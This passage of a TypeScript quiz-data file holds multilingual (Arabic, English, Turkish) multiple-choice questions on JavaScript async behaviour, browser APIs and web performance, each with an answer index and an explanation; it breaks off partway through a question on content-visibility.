import type { Question } from '#shared/types/quiz'
import { WHAT_ORDER, choice, output } from '../helpers'

export const WEB: Question[] = [
  // ───────── Async ─────────
  output({
    id: 'as-j-timeout-zero', level: 'junior', topic: 'async',
    prompt: WHAT_ORDER,
    code: `console.log('A');
setTimeout(() => console.log('B'), 0);
console.log('C');`,
    options: ['A, C, B', 'A, B, C', 'B, A, C', 'C, A, B'],
    answer: 0,
    why: {
      ar: 'setTimeout بمدة 0 لا ينفّذ فورًا، بل يضع الدالة في الطابور لتعمل بعد انتهاء الكود الحالي. لذلك يُطبع A ثم C، ثم B.',
      en: 'setTimeout with 0 does not run right away. It queues the callback to run after the current code finishes, so A, then C, then B.',
      tr: '0 süreli setTimeout hemen çalışmaz; callback’i mevcut kod bittikten sonra çalışmak üzere sıraya koyar. Önce A, sonra C, en son B.',
    },
  }),
  output({
    id: 'as-j-then-chain', level: 'junior', topic: 'async',
    code: `Promise.resolve(2)
  .then(x => x * 3)
  .then(x => console.log(x));`,
    options: ['6', '2', 'Promise { 6 }', 'undefined'],
    answer: 0,
    why: {
      ar: 'كل then يستقبل ما أرجعه الـ then الذي قبله. الأول يرجع 2 × 3 = 6، والثاني يطبعه.',
      en: 'Each then receives what the previous then returned. The first returns 2 × 3 = 6, the second logs it.',
      tr: 'Her then, bir öncekinin döndürdüğünü alır. İlki 2 × 3 = 6 döndürür, ikincisi yazdırır.',
    },
  }),
  output({
    id: 'as-j-catch-continue', level: 'junior', topic: 'async',
    code: `Promise.reject(new Error('fail'))
  .catch(e => console.log(e.message))
  .then(() => console.log('done'));`,
    options: ['fail, done', 'fail', 'done', 'Uncaught Error: fail'],
    answer: 0,
    why: {
      ar: 'catch يعالج الخطأ ويرجع Promise ناجحًا، فتستمر السلسلة إلى then التالي. لذلك يُطبع fail ثم done.',
      en: 'catch handles the error and returns a fulfilled Promise, so the chain carries on to the next then: fail, then done.',
      tr: 'catch hatayı işler ve başarılı bir Promise döndürür; zincir sonraki then ile devam eder: önce fail, sonra done.',
    },
  }),
  output({
    id: 'as-s-promise-any', level: 'senior', topic: 'async',
    code: `Promise.any([
  Promise.reject(new Error('a')),
  new Promise(r => setTimeout(() => r('slow'), 20)),
  Promise.resolve('fast'),
]).then(v => console.log(v));`,
    options: ['fast', 'slow', 'a', 'AggregateError'],
    answer: 0,
    why: {
      ar: 'Promise.any يرجع أول Promise ينجح ويتجاهل الفاشلة. لا يرمي AggregateError إلا إذا فشلت كلها. وfast نجح قبل slow.',
      en: 'Promise.any settles with the first Promise that fulfils and ignores rejections. It only throws AggregateError when all of them reject. fast fulfils before slow.',
      tr: 'Promise.any ilk başarılı olan Promise ile sonuçlanır, reddedilenleri yok sayar. Sadece hepsi reddedilirse AggregateError fırlatır. fast, slow’dan önce başarılı olur.',
    },
  }),
  output({
    id: 'as-s-thenable', level: 'senior', topic: 'async',
    code: `const thenable = {
  then(resolve) { resolve(42); },
};

(async () => {
  console.log(await thenable);
})();`,
    options: ['42', '{ then: [Function: then] }', 'undefined', 'TypeError'],
    answer: 0,
    why: {
      ar: 'await يقبل أي كائن فيه دالة then (thenable)، ويستدعيها كأنه Promise. لهذا تعمل مكتبات Promise القديمة مع await، ولهذا أيضًا لا تسمِّ دالة then في كائناتك دون قصد.',
      en: 'await accepts any object with a then method (a thenable) and calls it like a Promise. That is why old Promise libraries work with await, and why you should not name a method then by accident.',
      tr: 'await, then metodu olan her nesneyi (thenable) kabul eder ve Promise gibi çağırır. Eski Promise kütüphanelerinin await ile çalışmasının sebebi budur; bu yüzden bir metodu kazara then diye adlandırma.',
    },
  }),

  // ───────── Browser ─────────
  choice({
    id: 'b-j-console-errors', level: 'junior', topic: 'browser',
    prompt: {
      ar: 'الصفحة لا تعمل ولا تعرف السبب. أين ترى أخطاء JavaScript أولًا؟',
      en: 'The page is broken and you do not know why. Where do you look for JavaScript errors first?',
      tr: 'Sayfa çalışmıyor ve nedenini bilmiyorsun. JavaScript hatalarına önce nereden bakarsın?',
    },
    options: {
      ar: ['تبويب Console في أدوات المطوّر (DevTools)', 'في سجل المتصفح (History)', 'في إعدادات النظام', 'في ملف الـ HTML'],
      en: ['The Console tab in DevTools', 'In the browser History', 'In the system settings', 'In the HTML file'],
      tr: ['Geliştirici araçlarındaki (DevTools) Console sekmesi', 'Tarayıcı geçmişinde', 'Sistem ayarlarında', 'HTML dosyasında'],
    },
    answer: 0,
    why: {
      ar: 'افتح DevTools بـ F12 أو Ctrl+Shift+I. الـ Console يعرض الأخطاء مع اسم الملف ورقم السطر، وتبويب Network يعرض الطلبات الفاشلة.',
      en: 'Open DevTools with F12 or Ctrl+Shift+I. The Console shows errors with the file and line number, and the Network tab shows failed requests.',
      tr: 'DevTools’u F12 veya Ctrl+Shift+I ile aç. Console hataları dosya ve satır numarasıyla gösterir, Network sekmesi başarısız istekleri gösterir.',
    },
  }),
  choice({
    id: 'b-j-cookie-sent', level: 'junior', topic: 'browser',
    prompt: {
      ar: 'أي طريقة تخزين يرسلها المتصفح تلقائيًا مع كل طلب إلى الخادم؟',
      en: 'Which storage does the browser send to the server automatically with every request?',
      tr: 'Tarayıcı hangi depolamayı her istekle sunucuya otomatik gönderir?',
    },
    options: ['Cookies', 'localStorage', 'sessionStorage', 'IndexedDB'],
    answer: 0,
    why: {
      ar: 'الـ cookies تُرسل في ترويسة Cookie مع الطلبات لنفس الموقع، لذلك تُستخدم للجلسات. أما localStorage وsessionStorage وIndexedDB فتبقى في المتصفح ولا تُرسل إلا إذا أرسلتها بنفسك.',
      en: 'Cookies go in the Cookie header with requests to the same site, which is why they are used for sessions. localStorage, sessionStorage and IndexedDB stay in the browser unless you send them yourself.',
      tr: 'Cookie’ler aynı siteye giden isteklerde Cookie başlığıyla gönderilir; bu yüzden oturumlarda kullanılır. localStorage, sessionStorage ve IndexedDB tarayıcıda kalır, sen göndermedikçe gitmez.',
    },
  }),
  choice({
    id: 'b-j-404', level: 'junior', topic: 'browser',
    prompt: {
      ar: 'ماذا يعني رمز الحالة 404؟',
      en: 'What does status code 404 mean?',
      tr: '404 durum kodu ne anlama gelir?',
    },
    options: {
      ar: ['الصفحة أو المورد غير موجود', 'خطأ داخل الخادم', 'غير مسموح لك', 'تم بنجاح'],
      en: ['The page or resource was not found', 'An error inside the server', 'You are not allowed', 'Success'],
      tr: ['Sayfa veya kaynak bulunamadı', 'Sunucu içi hata', 'İzniniz yok', 'Başarılı'],
    },
    answer: 0,
    why: {
      ar: '4xx أخطاء من جهة الطلب: 404 غير موجود، 401 غير مسجّل الدخول، 403 ممنوع. و5xx أخطاء في الخادم مثل 500، و200 يعني نجاح.',
      en: '4xx are request-side errors: 404 not found, 401 not signed in, 403 forbidden. 5xx are server errors such as 500, and 200 means success.',
      tr: '4xx istek tarafı hatalarıdır: 404 bulunamadı, 401 giriş yapılmadı, 403 yasak. 5xx sunucu hatalarıdır (ör. 500), 200 ise başarı demektir.',
    },
  }),
  choice({
    id: 'b-j-https', level: 'junior', topic: 'browser',
    prompt: {
      ar: 'ماذا يضيف HTTPS مقارنة بـ HTTP؟',
      en: 'What does HTTPS add compared to HTTP?',
      tr: 'HTTPS, HTTP’ye göre ne ekler?',
    },
    options: {
      ar: ['تشفير الاتصال، فلا يقرأ أحد في الطريق البيانات أو يغيّرها', 'سرعة أكبر دائمًا', 'يمنع الـ bugs في الكود', 'يخزّن الصفحة في الكاش'],
      en: ['An encrypted connection, so nobody on the way can read or change the data', 'Always more speed', 'It prevents bugs in the code', 'It caches the page'],
      tr: ['Şifreli bağlantı; yoldaki kimse veriyi okuyamaz veya değiştiremez', 'Her zaman daha fazla hız', 'Koddaki hataları önler', 'Sayfayı önbelleğe alır'],
    },
    answer: 0,
    why: {
      ar: 'HTTPS = HTTP فوق TLS: يشفّر البيانات ويتحقق أنك تتصل بالموقع الصحيح. بدونه يمكن لمن على نفس الشبكة (مثل Wi-Fi عام) قراءة كلمات المرور.',
      en: 'HTTPS is HTTP over TLS: it encrypts the data and checks you are talking to the real site. Without it, someone on the same network (like public Wi-Fi) can read passwords.',
      tr: 'HTTPS, TLS üzerinden HTTP’dir: veriyi şifreler ve gerçek siteyle konuştuğunu doğrular. Onsuz aynı ağdaki biri (ör. açık Wi-Fi) şifreleri okuyabilir.',
    },
  }),
  choice({
    id: 'b-m-session-storage', level: 'mid', topic: 'browser',
    prompt: {
      ar: 'متى تُحذف البيانات المحفوظة في sessionStorage؟',
      en: 'When is data in sessionStorage removed?',
      tr: 'sessionStorage’daki veriler ne zaman silinir?',
    },
    options: {
      ar: ['عند إغلاق التبويب، وكل تبويب له نسخته الخاصة', 'بعد 24 ساعة', 'لا تُحذف أبدًا', 'عند تحديث الصفحة'],
      en: ['When the tab is closed, and every tab has its own copy', 'After 24 hours', 'Never', 'On page refresh'],
      tr: ['Sekme kapatılınca; her sekmenin kendi kopyası vardır', '24 saat sonra', 'Hiç silinmez', 'Sayfa yenilenince'],
    },
    answer: 0,
    why: {
      ar: 'sessionStorage يعيش ما دام التبويب مفتوحًا، ويبقى بعد التحديث. وفتح الموقع في تبويب جديد يبدأ بمخزن فارغ. أما localStorage فيبقى ويُشارك بين كل التبويبات.',
      en: 'sessionStorage lives as long as the tab is open and survives a refresh. Opening the site in a new tab starts empty. localStorage stays and is shared by all tabs.',
      tr: 'sessionStorage sekme açık kaldıkça yaşar ve yenilemeden etkilenmez. Siteyi yeni sekmede açmak boş bir depoyla başlar. localStorage ise kalıcıdır ve tüm sekmelerce paylaşılır.',
    },
  }),
  choice({
    id: 'b-m-delegation', level: 'mid', topic: 'browser',
    prompt: {
      ar: 'قائمة فيها 1000 عنصر، والعناصر تُضاف وتُحذف باستمرار. ما أفضل طريقة للاستماع للنقر عليها؟',
      en: 'A list has 1,000 items that are added and removed all the time. What is the best way to listen for clicks on them?',
      tr: 'Sürekli eklenip silinen 1.000 öğeli bir liste var. Tıklamaları dinlemenin en iyi yolu nedir?',
    },
    code: `list.addEventListener('click', (e) => {
  const item = e.target.closest('li');
  if (item) open(item.dataset.id);
});`,
    options: {
      ar: ['مستمع واحد على الأب (event delegation) كما في الكود', 'مستمع لكل li', 'setInterval يفحص النقرات', 'onclick داخل الـ HTML لكل عنصر'],
      en: ['One listener on the parent (event delegation), like this code', 'One listener per li', 'A setInterval that checks for clicks', 'An onclick in the HTML for each item'],
      tr: ['Kodda olduğu gibi üst elemanda tek bir dinleyici (event delegation)', 'Her li için bir dinleyici', 'Tıklamaları kontrol eden bir setInterval', 'Her öğe için HTML’de onclick'],
    },
    answer: 0,
    why: {
      ar: 'حدث النقر «يصعد» (bubbling) من الـ li إلى الأب، فيكفي مستمع واحد. يوفّر الذاكرة، ويعمل تلقائيًا مع العناصر الجديدة. وclosest يضمن الوصول إلى الـ li حتى لو نُقر على عنصر بداخله.',
      en: 'The click bubbles up from the li to the parent, so one listener is enough. It saves memory and works for new items automatically. closest makes sure you get the li even when a child inside it was clicked.',
      tr: 'Tıklama olayı li’den üst elemana kabarır (bubbling); tek dinleyici yeterlidir. Bellek tasarrufu sağlar ve yeni öğelerle otomatik çalışır. closest, içteki bir elemana tıklansa bile li’ye ulaşmanı sağlar.',
    },
  }),
  choice({
    id: 'b-s-passive', level: 'senior', topic: 'browser',
    prompt: {
      ar: 'هل يمنع هذا الكود التمرير على الجوال؟',
      en: 'Does this code stop scrolling on a phone?',
      tr: 'Bu kod telefonda kaydırmayı engeller mi?',
    },
    code: `document.addEventListener('touchmove', (e) => {
  e.preventDefault();
}, { passive: true });`,
    options: {
      ar: ['لا. في المستمع passive يُتجاهل preventDefault ويظهر تحذير', 'نعم، يمنعه تمامًا', 'نعم، لكن فقط في iOS', 'يرمي خطأ ويوقف الصفحة'],
      en: ['No. In a passive listener preventDefault is ignored and a warning is logged', 'Yes, completely', 'Yes, but only on iOS', 'It throws and breaks the page'],
      tr: ['Hayır. Passive dinleyicide preventDefault yok sayılır ve uyarı yazılır', 'Evet, tamamen', 'Evet, ama sadece iOS’ta', 'Hata fırlatıp sayfayı bozar'],
    },
    answer: 0,
    why: {
      ar: 'passive: true وعدٌ للمتصفح بأنك لن تمنع التمرير، فيبدأ التمرير فورًا دون انتظار الكود، وهذا يجعله أنعم. لمنع التمرير فعلًا تحتاج passive: false، أو الأفضل touch-action في CSS.',
      en: 'passive: true promises the browser you will not block scrolling, so it starts scrolling without waiting for your code, which keeps it smooth. To really block it you need passive: false, or better, touch-action in CSS.',
      tr: 'passive: true, tarayıcıya kaydırmayı engellemeyeceğine dair bir sözdür; tarayıcı kodunu beklemeden kaydırır ve akıcı olur. Gerçekten engellemek için passive: false ya da daha iyisi CSS’te touch-action gerekir.',
    },
  }),
  choice({
    id: 'b-s-service-worker', level: 'senior', topic: 'browser',
    prompt: {
      ar: 'أي من هذه يستطيع الـ Service Worker فعله؟',
      en: 'Which of these can a Service Worker do?',
      tr: 'Bunlardan hangisini bir Service Worker yapabilir?',
    },
    options: {
      ar: ['اعتراض طلبات الشبكة والرد من الكاش، فيعمل الموقع دون إنترنت', 'تعديل الـ DOM مباشرة', 'قراءة localStorage', 'العمل على http عادي في موقع حقيقي'],
      en: ['Intercept network requests and answer from a cache, so the site works offline', 'Change the DOM directly', 'Read localStorage', 'Run over plain http on a live site'],
      tr: ['Ağ isteklerini yakalayıp önbellekten yanıtlamak; site çevrimdışı çalışır', 'DOM’u doğrudan değiştirmek', 'localStorage okumak', 'Gerçek bir sitede düz http üzerinde çalışmak'],
    },
    answer: 0,
    why: {
      ar: 'الـ Service Worker يعمل في خيط منفصل كوسيط بين الصفحة والشبكة (حدث fetch). لا يصل للـ DOM ولا لـ localStorage، ويستخدم Cache API وIndexedDB، ويتطلب HTTPS (عدا localhost).',
      en: 'A Service Worker runs on its own thread as a proxy between the page and the network (the fetch event). It has no DOM or localStorage, uses the Cache API and IndexedDB, and needs HTTPS (except on localhost).',
      tr: 'Service Worker ayrı bir iş parçacığında, sayfa ile ağ arasında bir aracı olarak çalışır (fetch olayı). DOM’a ve localStorage’a erişemez; Cache API ve IndexedDB kullanır, HTTPS ister (localhost hariç).',
    },
  }),
  choice({
    id: 'b-s-bfcache-unload', level: 'senior', topic: 'browser',
    prompt: {
      ar: 'أي مستمع يمنع الصفحة غالبًا من دخول الـ back/forward cache، فيصبح زر «رجوع» أبطأ؟',
      en: 'Which listener usually keeps a page out of the back/forward cache, making the Back button slower?',
      tr: 'Hangi dinleyici genellikle sayfanın back/forward cache’e girmesini engelleyip "Geri" tuşunu yavaşlatır?',
    },
    options: ['unload', 'pagehide', 'visibilitychange', 'DOMContentLoaded'],
    answer: 0,
    why: {
      ar: 'الـ bfcache يحفظ الصفحة كاملة في الذاكرة لترجع فورًا. مستمعات unload تجعل المتصفحات تتخلى عنه غالبًا. استخدم pagehide أو visibilitychange لحفظ البيانات وإرسال الإحصاءات.',
      en: 'The bfcache keeps the whole page in memory so Back is instant. unload listeners usually make browsers skip it. Use pagehide or visibilitychange to save data and send analytics.',
      tr: 'bfcache tüm sayfayı bellekte tutar, "Geri" anında olur. unload dinleyicileri tarayıcıların genelde bundan vazgeçmesine yol açar. Veri kaydetmek ve analitik göndermek için pagehide veya visibilitychange kullan.',
    },
  }),

  // ───────── Performance ─────────
  choice({
    id: 'p-j-image-size', level: 'junior', topic: 'performance',
    prompt: {
      ar: 'صورة بعرض 4000px وحجم 5MB تُعرض في مربع عرضه 400px. ما أفضل تحسين؟',
      en: 'A 4000px, 5 MB photo is shown in a 400px box. What is the best fix?',
      tr: '4000px genişliğinde, 5 MB’lık bir fotoğraf 400px’lik bir kutuda gösteriliyor. En iyi iyileştirme nedir?',
    },
    options: {
      ar: ['تصغيرها وضغطها بصيغة حديثة مثل WebP أو AVIF', 'تصغيرها بـ CSS فقط', 'وضعها كخلفية', 'لا مشكلة'],
      en: ['Resize it and compress it to a modern format like WebP or AVIF', 'Only shrink it with CSS', 'Use it as a background image', 'There is no problem'],
      tr: ['Boyutunu küçültüp WebP veya AVIF gibi modern bir biçimde sıkıştırmak', 'Sadece CSS ile küçültmek', 'Arka plan görseli yapmak', 'Sorun yok'],
    },
    answer: 0,
    why: {
      ar: 'CSS يصغّر العرض فقط، لكن المتصفح يحمّل 5MB كاملة. صورة 800px (لشاشات الكثافة العالية) بصيغة WebP قد تكون أقل من 100KB.',
      en: 'CSS only shrinks how it looks; the browser still downloads all 5 MB. An 800px WebP (for high-density screens) can be under 100 KB.',
      tr: 'CSS sadece görünümü küçültür, tarayıcı yine 5 MB indirir. 800px’lik bir WebP (yüksek yoğunluklu ekranlar için) 100 KB’ın altında olabilir.',
    },
  }),
  choice({
    id: 'p-j-lazy-img', level: 'junior', topic: 'performance',
    prompt: {
      ar: 'ماذا يفعل loading="lazy" على الصور في أسفل الصفحة؟',
      en: 'What does loading="lazy" do on images far down the page?',
      tr: 'Sayfanın aşağısındaki görsellerde loading="lazy" ne yapar?',
    },
    code: `<img src="gallery-12.jpg" loading="lazy" alt="…">`,
    codeLang: 'html',
    options: {
      ar: ['يؤجل تحميلها حتى يقترب المستخدم منها أثناء التمرير', 'يحمّلها بجودة أقل', 'يمنع تحميلها نهائيًا', 'يحمّلها قبل باقي الصفحة'],
      en: ['It delays loading until the user scrolls close to them', 'It loads them at lower quality', 'It never loads them', 'It loads them before the rest of the page'],
      tr: ['Kullanıcı kaydırıp yaklaşana kadar yüklemeyi erteler', 'Daha düşük kalitede yükler', 'Hiç yüklemez', 'Sayfanın geri kalanından önce yükler'],
    },
    answer: 0,
    why: {
      ar: 'التحميل الكسول يوفّر البيانات ويسرّع ظهور أول الصفحة. لكن لا تضعه على الصورة الكبيرة في أعلى الصفحة (LCP)، لأن ذلك يؤخر ظهورها.',
      en: 'Lazy loading saves data and speeds up the top of the page. Do not put it on the big image at the top (the LCP image), because that delays it.',
      tr: 'Lazy loading veri tasarrufu sağlar ve sayfanın üst kısmını hızlandırır. Ama en üstteki büyük görsele (LCP görseli) koyma; onu geciktirir.',
    },
  }),
  choice({
    id: 'p-j-minify-compress', level: 'junior', topic: 'performance',
    prompt: {
      ar: 'ما الذي يقلل حجم ملف JavaScript المنقول دون تغيير سلوكه؟',
      en: 'What makes a JavaScript file smaller over the network without changing what it does?',
      tr: 'Bir JavaScript dosyasının davranışını değiştirmeden ağdaki boyutunu ne küçültür?',
    },
    options: {
      ar: ['التصغير (minify) مع الضغط gzip أو Brotli على الخادم', 'إعادة تسمية الملف', 'نقل الكود إلى ملف HTML', 'إضافة تعليقات أقل فقط'],
      en: ['Minifying plus gzip or Brotli compression on the server', 'Renaming the file', 'Moving the code into the HTML file', 'Only writing fewer comments'],
      tr: ['Minify ve sunucuda gzip veya Brotli sıkıştırma', 'Dosyanın adını değiştirmek', 'Kodu HTML dosyasına taşımak', 'Sadece daha az yorum yazmak'],
    },
    answer: 0,
    why: {
      ar: 'الـ minify يحذف المسافات والتعليقات ويقصّر الأسماء، وBrotli/gzip يضغط الملف أثناء النقل. معًا قد يصغر الملف إلى أقل من ربع حجمه. وأدوات البناء مثل Vite تفعل الأول تلقائيًا.',
      en: 'Minifying removes spaces and comments and shortens names, and Brotli/gzip compresses the file in transit. Together they can cut it to under a quarter. Build tools like Vite minify for you.',
      tr: 'Minify boşlukları ve yorumları siler, adları kısaltır; Brotli/gzip dosyayı aktarım sırasında sıkıştırır. Birlikte boyutu dörtte birin altına indirebilir. Vite gibi araçlar minify’ı kendisi yapar.',
    },
  }),
  choice({
    id: 'p-m-debounce-search', level: 'mid', topic: 'performance',
    prompt: {
      ar: 'حقل بحث يرسل طلبًا إلى الخادم مع كل حرف. ما الحل الأنسب؟',
      en: 'A search box sends a server request on every keystroke. What is the best fix?',
      tr: 'Bir arama kutusu her tuşta sunucuya istek gönderiyor. En uygun çözüm nedir?',
    },
    options: {
      ar: ['debounce: انتظر توقف الكتابة نحو 300ms ثم أرسل', 'throttle على حدث scroll', 'إرسال الطلب كل 5 ثوانٍ مهما حدث', 'تعطيل الحقل أثناء الطلب'],
      en: ['Debounce: wait until typing pauses for ~300 ms, then send', 'Throttle the scroll event', 'Send a request every 5 seconds no matter what', 'Disable the input during the request'],
      tr: ['Debounce: yazma ~300 ms durunca gönder', 'scroll olayını throttle etmek', 'Ne olursa olsun her 5 saniyede istek göndermek', 'İstek sırasında input’u devre dışı bırakmak'],
    },
    answer: 0,
    why: {
      ar: 'debounce يؤجل التنفيذ حتى يتوقف المستخدم عن الكتابة، فتصبح كلمة «react» طلبًا واحدًا بدل خمسة. وthrottle يحدد عدد المرات في الثانية، وهو أنسب للتمرير وتغيير الحجم.',
      en: 'Debounce waits until the user stops typing, so "react" becomes one request instead of five. Throttle limits how often something runs per second, which suits scroll and resize.',
      tr: 'Debounce kullanıcı yazmayı bırakana kadar bekler; "react" beş yerine tek istek olur. Throttle saniyedeki çalışma sayısını sınırlar; scroll ve resize için daha uygundur.',
    },
  }),
  choice({
    id: 'p-m-immutable-cache', level: 'mid', topic: 'performance',
    prompt: {
      ar: 'ملفات البناء أسماؤها فيها hash مثل app.3f9a2c.js. ما ترويسة الكاش المناسبة لها؟',
      en: 'Build files have a hash in their name, like app.3f9a2c.js. Which cache header fits them?',
      tr: 'Derleme dosyalarının adında app.3f9a2c.js gibi bir hash var. Bunlar için uygun önbellek başlığı hangisi?',
    },
    options: ['Cache-Control: public, max-age=31536000, immutable', 'Cache-Control: no-store', 'Cache-Control: max-age=0', 'Expires: 0'],
    answer: 0,
    why: {
      ar: 'إذا تغيّر محتوى الملف تغيّر اسمه، فلا خطر أن يرى المستخدم نسخة قديمة. لذلك يمكن تخزينه سنة كاملة. أما ملف index.html فيُترك بكاش قصير أو no-cache ليشير دائمًا إلى الأسماء الجديدة.',
      en: 'If the content changes, so does the name, so users never get a stale copy. That makes a one-year cache safe. Keep index.html on a short cache or no-cache so it always points to the new names.',
      tr: 'İçerik değişince ad da değişir, kullanıcı eski kopyayı görmez. Bu yüzden bir yıllık önbellek güvenlidir. index.html’i ise kısa önbellek veya no-cache ile bırak ki hep yeni adları göstersin.',
    },
  }),
  choice({
    id: 'p-m-font-display', level: 'mid', topic: 'performance',
    prompt: {
      ar: 'ماذا يفعل font-display: swap؟',
      en: 'What does font-display: swap do?',
      tr: 'font-display: swap ne yapar?',
    },
    code: `@font-face {
  font-family: 'Cairo';
  src: url('/fonts/cairo.woff2') format('woff2');
  font-display: swap;
}`,
    codeLang: 'css',
    options: {
      ar: ['يعرض النص فورًا بخط بديل ثم يبدّله عندما يصل الخط', 'يخفي النص حتى يصل الخط', 'يمنع تحميل الخط', 'يحمّل الخط من Google تلقائيًا'],
      en: ['Shows text right away in a fallback font, then swaps when the font arrives', 'Hides text until the font arrives', 'Stops the font from loading', 'Loads the font from Google automatically'],
      tr: ['Metni hemen yedek fontla gösterir, font gelince değiştirir', 'Font gelene kadar metni gizler', 'Fontun yüklenmesini engeller', 'Fontu otomatik olarak Google’dan yükler'],
    },
    answer: 0,
    why: {
      ar: 'بدونه قد يبقى النص غير مرئي حتى 3 ثوانٍ في الشبكات البطيئة. swap يجعل المحتوى مقروءًا فورًا. ولتقليل قفزة التخطيط عند التبديل اختر خطًا بديلًا قريب المقاسات.',
      en: 'Without it, text can stay invisible for up to 3 seconds on slow networks. swap makes content readable at once. To reduce the layout jump when it swaps, pick a fallback with similar metrics.',
      tr: 'Onsuz metin yavaş ağlarda 3 saniyeye kadar görünmez kalabilir. swap içeriği hemen okunur yapar. Değişimdeki kaymayı azaltmak için ölçüleri benzer bir yedek font seç.',
    },
  }),
  choice({
    id: 'p-m-virtual-list', level: 'mid', topic: 'performance',
    prompt: {
      ar: 'جدول فيه 10,000 صف يجعل الصفحة بطيئة جدًا. ما الحل الأكثر فعالية؟',
      en: 'A table with 10,000 rows makes the page very slow. What helps most?',
      tr: '10.000 satırlık bir tablo sayfayı çok yavaşlatıyor. En etkili çözüm nedir?',
    },
    options: {
      ar: ['virtualization: رسم الصفوف الظاهرة على الشاشة فقط', 'تصغير الخط', 'استخدام table بدل div', 'إضافة will-change لكل صف'],
      en: ['Virtualization: render only the rows visible on screen', 'A smaller font', 'Using table instead of div', 'Adding will-change to every row'],
      tr: ['Virtualization: sadece ekranda görünen satırları çizmek', 'Daha küçük yazı', 'div yerine table kullanmak', 'Her satıra will-change eklemek'],
    },
    answer: 0,
    why: {
      ar: 'المشكلة في عدد عناصر الـ DOM. القائمة الافتراضية ترسم نحو 30 صفًا فقط، وتبدّل محتواها أثناء التمرير، فيبقى الـ DOM صغيرًا مهما كبرت البيانات. والترقيم (pagination) حل بديل.',
      en: 'The problem is the number of DOM nodes. A virtual list renders about 30 rows and swaps their content as you scroll, so the DOM stays small however big the data gets. Pagination is the other option.',
      tr: 'Sorun DOM eleman sayısıdır. Sanal liste yaklaşık 30 satır çizer ve kaydırdıkça içeriklerini değiştirir; veri ne kadar büyürse büyüsün DOM küçük kalır. Sayfalama da bir seçenektir.',
    },
  }),
  choice({
    id: 'p-m-preconnect', level: 'mid', topic: 'performance',
    prompt: {
      ar: 'ما فائدة هذا السطر في <head>؟',
      en: 'What does this line in <head> do?',
      tr: '<head> içindeki bu satır ne işe yarar?',
    },
    code: `<link rel="preconnect" href="https://api.example.com">`,
    codeLang: 'html',
    options: {
      ar: ['يجهّز الاتصال مبكرًا (DNS وTCP وTLS) فتكون الطلبات اللاحقة أسرع', 'يحمّل كل بيانات الـ API مسبقًا', 'يمنع CORS', 'يخزّن الردود في الكاش'],
      en: ['Opens the connection early (DNS, TCP, TLS) so later requests start faster', 'Downloads all API data in advance', 'Disables CORS', 'Caches the responses'],
      tr: ['Bağlantıyı erkenden kurar (DNS, TCP, TLS); sonraki istekler daha hızlı başlar', 'Tüm API verisini önceden indirir', 'CORS’u kapatır', 'Yanıtları önbelleğe alır'],
    },
    answer: 0,
    why: {
      ar: 'إنشاء اتصال HTTPS جديد قد يأخذ عدة رحلات ذهاب وعودة. preconnect يبدأها أثناء تحميل الصفحة، فيوفّر 100 إلى 300ms على أول طلب. استخدمه لنطاق أو اثنين مهمين فقط.',
      en: 'A new HTTPS connection can take several round trips. preconnect starts it while the page loads, saving 100–300 ms on the first request. Use it for one or two important origins only.',
      tr: 'Yeni bir HTTPS bağlantısı birkaç gidiş-dönüş sürebilir. preconnect bunu sayfa yüklenirken başlatır ve ilk istekte 100–300 ms kazandırır. Sadece bir iki önemli alan adı için kullan.',
    },
  }),
  choice({
    id: 'p-m-tree-shaking', level: 'mid', topic: 'performance',
    prompt: {
      ar: 'أي استيراد يسمح للـ bundler بحذف الدوال غير المستخدمة (tree shaking)؟',
      en: 'Which import lets the bundler drop unused functions (tree shaking)?',
      tr: 'Hangi import, bundler’ın kullanılmayan fonksiyonları atmasına (tree shaking) izin verir?',
    },
    options: [`import { debounce } from 'lodash-es'`, `import _ from 'lodash'`, `const _ = require('lodash')`, `import * as _ from 'lodash'`],
    answer: 0,
    why: {
      ar: 'tree shaking يعتمد على ES modules والاستيراد بالاسم. lodash العادية بصيغة CommonJS فتدخل كاملة (نحو 70KB)، أما lodash-es مع { debounce } فتُدخل الدالة فقط.',
      en: 'Tree shaking relies on ES modules and named imports. Plain lodash is CommonJS, so all of it ships (around 70 KB). lodash-es with { debounce } ships just that function.',
      tr: 'Tree shaking, ES modüllerine ve isimli import’a dayanır. Düz lodash CommonJS’tir, tamamı gelir (yaklaşık 70 KB). lodash-es ile { debounce } ise sadece o fonksiyonu getirir.',
    },
  }),
  choice({
    id: 'p-s-inp', level: 'senior', topic: 'performance',
    prompt: {
      ar: 'أي مقياس من Core Web Vitals يقيس سرعة استجابة الصفحة لنقرات المستخدم وكتابته طوال الزيارة؟',
      en: 'Which Core Web Vital measures how fast the page responds to clicks and typing throughout the visit?',
      tr: 'Hangi Core Web Vital, ziyaret boyunca sayfanın tıklama ve yazmaya ne kadar hızlı yanıt verdiğini ölçer?',
    },
    options: ['INP', 'LCP', 'CLS', 'TTFB'],
    answer: 0,
    why: {
      ar: 'INP (Interaction to Next Paint) حلّ محل FID عام 2024. يقيس الوقت من التفاعل حتى ظهور التغيير على الشاشة، والجيد أقل من 200ms. وLCP لسرعة ظهور المحتوى، وCLS لثبات التخطيط.',
      en: 'INP (Interaction to Next Paint) replaced FID in 2024. It measures the time from an interaction to the next frame on screen; good is under 200 ms. LCP is loading speed and CLS is layout stability.',
      tr: 'INP (Interaction to Next Paint), 2024’te FID’in yerini aldı. Etkileşimden ekrandaki bir sonraki kareye kadar geçen süreyi ölçer; iyi değer 200 ms altıdır. LCP yükleme hızını, CLS düzen kararlılığını ölçer.',
    },
  }),
  choice({
    id: 'p-s-content-visibility', level: 'senior', topic: 'performance',
    prompt: {
      ar: 'ماذا يفعل content-visibility: auto على أقسام طويلة أسفل الصفحة؟',
      en: 'What does content-visibility: auto do on long sections further down the page?',
      tr: 'Sayfanın aşağısındaki uzun bölümlerde content-visibility: auto ne yapar?',
    },
    code: `.article-section {
  content-visibility: auto;
  contain-intrinsic-size: auto 800px;
}`,
    codeLang: 'css',
    options: {
      ar: ['يتخطى المتصفح رسم الأقسام البعيدة عن الشاشة حتى تقترب', 'يخفي الأقسام عن محركات البحث', 'يحمّل الأقسام من الخادم عند التمرير', 'يحذف الأقسام من الـ DOM'],
      en: ['The browser skips rendering sections far from the screen until they come near', 'Hides the sections from search engines', 'Loads the sections from the server on scroll', 'Removes the sections from the DOM'],
      tr: ['Tarayıcı ekrandan uzak bölümleri yaklaşana kadar çizmez', 'Bölümleri arama motorlarından gizler', 'Bölümleri kaydırınca sunucudan yükler', 'Bölümleri DOM’dan siler'],
    },
    answer: 0,
    why: {
